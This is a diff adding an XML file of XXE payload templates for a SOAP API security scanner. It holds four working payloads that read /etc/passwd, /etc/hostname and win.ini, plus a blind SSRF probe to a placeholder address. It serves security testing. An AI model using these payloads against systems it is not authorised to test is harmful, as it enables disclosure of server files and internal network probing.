@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+    xxe_payloads.xml — XXE payload templates for Aegis-API SOAP scanner.
+
+    Each <payload> element contains one attack variant.
+    The scanner loads these at runtime and substitutes:
+        {{NAMESPACE}}   → target SOAP namespace (from WSDL)
+        {{OPERATION}}   → SOAP operation name (from WSDL)
+        {{PARAM}}       → parameter name to inject into (from WSDL)
+
+    Severity of all XXE findings is Critical.
+    Reference: OWASP API Security Top 10 — API7 (Security Misconfiguration)
+               CWE-611: Improper Restriction of XML External Entity Reference
+-->
+
+<xxe_payloads>
+
+    <!--
+        PAYLOAD 1 — Linux /etc/passwd read (in-band)
+        Classic file read. If parser resolves external entities and the
+        application echoes the field value, /etc/passwd content appears
+        in the response body.
+        Detection: look for "root:" or "nobody:" in any response field.
+    -->
+    <payload id="linux_passwd" type="file_read" blind="false">
+        <description>Linux /etc/passwd read via SYSTEM entity</description>
+        <detection_marker>root:</detection_marker>
+        <body>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Body&gt;
+    &lt;{{OPERATION}} xmlns="{{NAMESPACE}}"&gt;
+      &lt;{{PARAM}}&gt;&amp;xxe;&lt;/{{PARAM}}&gt;
+    &lt;/{{OPERATION}}&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+        </body>
+    </payload>
+
+    <!--
+        PAYLOAD 2 — Windows win.ini read (in-band)
+        Same attack targeting Windows servers.
+        Detection: look for "[fonts]" which always appears in win.ini.
+    -->
+    <payload id="windows_winini" type="file_read" blind="false">
+        <description>Windows win.ini read via SYSTEM entity</description>
+        <detection_marker>[fonts]</detection_marker>
+        <body>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"&gt;
+]&gt;
+&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Body&gt;
+    &lt;{{OPERATION}} xmlns="{{NAMESPACE}}"&gt;
+      &lt;{{PARAM}}&gt;&amp;xxe;&lt;/{{PARAM}}&gt;
+    &lt;/{{OPERATION}}&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+        </body>
+    </payload>
+
+    <!--
+        PAYLOAD 3 — SSRF via HTTP entity (blind probe)
+        Forces the server to make an outbound HTTP request.
+        In real engagements this URL would be a Burp Collaborator / interactsh
+        callback URL. Here we use a non-routable address to detect timing delay.
+        Detection: response time > 5 seconds suggests the server attempted
+        the outbound connection (blind XXE indicator).
+    -->
+    <payload id="ssrf_http" type="ssrf" blind="true">
+        <description>SSRF via HTTP external entity — blind timing probe</description>
+        <detection_marker>BLIND_TIMING</detection_marker>
+        <body>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://192.0.2.1/aegis-xxe-probe"&gt;
+]&gt;
+&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Body&gt;
+    &lt;{{OPERATION}} xmlns="{{NAMESPACE}}"&gt;
+      &lt;{{PARAM}}&gt;&amp;xxe;&lt;/{{PARAM}}&gt;
+    &lt;/{{OPERATION}}&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+        </body>
+    </payload>
+
+    <!--
+        PAYLOAD 4 — /etc/hostname read (in-band, short output)
+        Hostname files are short (one line) — ideal for verifying
+        in-band XXE on systems where /etc/passwd may be locked.
+        Detection: any short single-word string appearing in a
+        field that previously contained a number or known value.
+    -->
+    <payload id="linux_hostname" type="file_read" blind="false">
+        <description>Linux /etc/hostname read via SYSTEM entity</description>
+        <detection_marker>FIELD_VALUE_CHANGED</detection_marker>
+        <body>
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;
+]&gt;
+&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
+  &lt;soap:Body&gt;
+    &lt;{{OPERATION}} xmlns="{{NAMESPACE}}"&gt;
+      &lt;{{PARAM}}&gt;&amp;xxe;&lt;/{{PARAM}}&gt;
+    &lt;/{{OPERATION}}&gt;
+  &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;
+        </body>
+    </payload>
+
+</xxe_payloads>
